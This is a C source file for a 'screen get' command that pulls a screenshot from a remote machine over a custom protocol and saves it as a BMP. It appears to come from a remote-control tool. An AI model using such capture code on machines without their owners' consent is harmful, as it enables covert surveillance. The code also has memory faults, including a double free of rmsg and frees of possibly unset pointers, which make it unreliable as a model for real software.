#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "types.h"
#include "logger.h"
#include "cmd/commands.h"
#include "net/interface.h"
#include "net/error.h"
#include "progressbar.h"
#include "bmp.h"

#define COMMAND_SCREEN_GET_DATA 0x6
#define COMMAND_SCREEN_GET_END 0xB
#define COMMAND_SCREEN_GET_TEMP_FILE "screen_temp"

int command_Screen_Get(char* msg, int len)
{
	int argsIndex = 0;
	char* prntWidth;

	argsIndex = commands_ExportArg(&msg, &prntWidth, 0);

	if(!argsIndex)
	{
		free(prntWidth);
		free(msg);

		return COMMANDS_UNKNOW_COMMAND;
	}

	char* prntHeight;

	argsIndex = commands_ExportArg(&msg, &prntHeight, argsIndex);

	if(!argsIndex)
	{
		free(prntHeight);
		free(msg);

		return COMMANDS_UNKNOW_COMMAND;
	}

	char* fpath = malloc(strlen(msg + argsIndex) + sizeof(char));
	memset(fpath, 0, strlen(msg + argsIndex) + sizeof(char));
	strcpy(fpath, msg + argsIndex);

	free(msg);
	
	uint32 scWidth = atoi(prntWidth);
	uint32 scHeight = atoi(prntHeight);
	free(prntWidth);
	free(prntHeight);

	uint8 s_size[9];
	s_size[0] = (scWidth) & 0xFF;
	s_size[1] = (scWidth >> 8) & 0xFF;
	s_size[2] = (scWidth >> 16) & 0xFF;
	s_size[3] = (scWidth >> 24) & 0xFF;
	s_size[4] = (scHeight) & 0xFF;
	s_size[5] = (scHeight >> 8) & 0xFF;
	s_size[6] = (scHeight >> 16) & 0xFF;
	s_size[7] = (scHeight >> 24) & 0xFF;
	s_size[8] = 0;

	int rv = net_SendCmd(s_size, 9, COMMANDS_SCREEN_GET);

	if(rv == NET_LOST_CONNECTION)
	{
		LOG(LOG_ERR, "Failed to send!\n");
		free(fpath);
		
		return NET_LOST_CONNECTION;
	}

	uint8* rmsg;
	
	rv = net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES);

	if(rv == NET_LOST_CONNECTION)
	{
		LOG(LOG_ERR, "Failed to receive!\n");
		free(rmsg);
		free(fpath);

		return NET_LOST_CONNECTION;

	}else if(rv == NET_TIMED_OUT){
		LOG(LOG_ERR, "Time out!\n");
		free(rmsg);
		free(fpath);

		return NET_LOST_CONNECTION;
	}

	if(rmsg[0] != COMMANDS_APPROVE)
	{
		LOG(LOG_ERR, "Failed to take screenshot!\n");
		free(rmsg);
		free(fpath);

		return COMMANDS_SUCC;
	}

	scWidth = (rmsg[1] & 0xFF) | (rmsg[2] & 0xFF) << 8 | (rmsg[3] & 0xFF) << 16 | (rmsg[4] & 0xFF) << 24;
	scHeight = (rmsg[5] & 0xFF) | (rmsg[6] & 0xFF) << 8 | (rmsg[7] & 0xFF) << 16 | (rmsg[8] & 0xFF) << 24;
	uint32 size = scWidth * scHeight * 3;
	free(rmsg);

	LOG(LOG_INFO, "Image width: %d\n", scWidth);
	LOG(LOG_INFO, "Image height: %d\n", scHeight);
	LOG(LOG_INFO, "Image size: %d %s\n", (size / 1024) < 1 ? size : size / 1024, (size / 1024) < 1 ? "B" : "KB");
	LOG(LOG_INFO, "Image BPP: 24\n");

	LOG(LOG_INFO, "Creating temp file %s\n", COMMAND_SCREEN_GET_TEMP_FILE);
	
	FILE *f = fopen(COMMAND_SCREEN_GET_TEMP_FILE, "wb");

	if(!f)
	{
		LOG(LOG_ERR, "Failed to create %s\n", COMMAND_SCREEN_GET_TEMP_FILE);
		free(rmsg);

		return NET_LOST_CONNECTION;
	}

	progressbar_Max = size;
	progressbar_Start();
	progressbar_WaitToStart();

	while((rv = net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES)) > 0)
	{
		if(rmsg[0] == COMMAND_SCREEN_GET_END)
		{
			break;
		}else if(rmsg[0] == COMMAND_SCREEN_GET_DATA){
			fwrite(rmsg + 1, 1, rv - 1, f);
			progressbar_Index += rv - 1;
		}

		free(rmsg);

		if(net_SendCmd((uint8*)" ", 1, 0) == NET_LOST_CONNECTION)
		{
			progressbar_CriticalStop();
			fclose(f);
			free(fpath);
			remove(COMMAND_SCREEN_GET_TEMP_FILE);

			return NET_LOST_CONNECTION;
		}
	}

	fclose(f);
	free(rmsg);

	if(rv < 1)
	{
		progressbar_CriticalStop();
	}else{
		progressbar_Stop();
	}

	if(rv == NET_LOST_CONNECTION)
	{
		LOG(LOG_ERR, "Failed to receive!\n");
		free(fpath);
		remove(COMMAND_SCREEN_GET_TEMP_FILE);

		return NET_LOST_CONNECTION;

	}else if(rv == NET_TIMED_OUT){
		LOG(LOG_ERR, "Time out!\n");		
		free(fpath);
		remove(COMMAND_SCREEN_GET_TEMP_FILE);

		return NET_LOST_CONNECTION;
	}

	f = fopen(COMMAND_SCREEN_GET_TEMP_FILE, "rb");

	if(!f)
	{
		LOG(LOG_ERR, "Failed to open temp file %s\n", COMMAND_SCREEN_GET_TEMP_FILE);
		free(fpath);

		return COMMANDS_SUCC;
	}

	fseek(f, 0, SEEK_END);
	uint32 fsize = ftell(f);
	fseek(f, 0, SEEK_SET);

	uint8* imageData = malloc(fsize + sizeof(uint8));

	if(!fread(imageData, 1, fsize, f))
	{
		LOG(LOG_ERR, "Failed to read temp file %s\n", COMMAND_SCREEN_GET_TEMP_FILE);
		free(imageData);
		free(fpath);

		return COMMANDS_SUCC;
	}

	fclose(f);
	remove(COMMAND_SCREEN_GET_TEMP_FILE);

	bmp_Create(fpath, imageData, scWidth, scHeight, 0);
	
	free(imageData);
	free(fpath);

	return COMMANDS_SUCC;
}
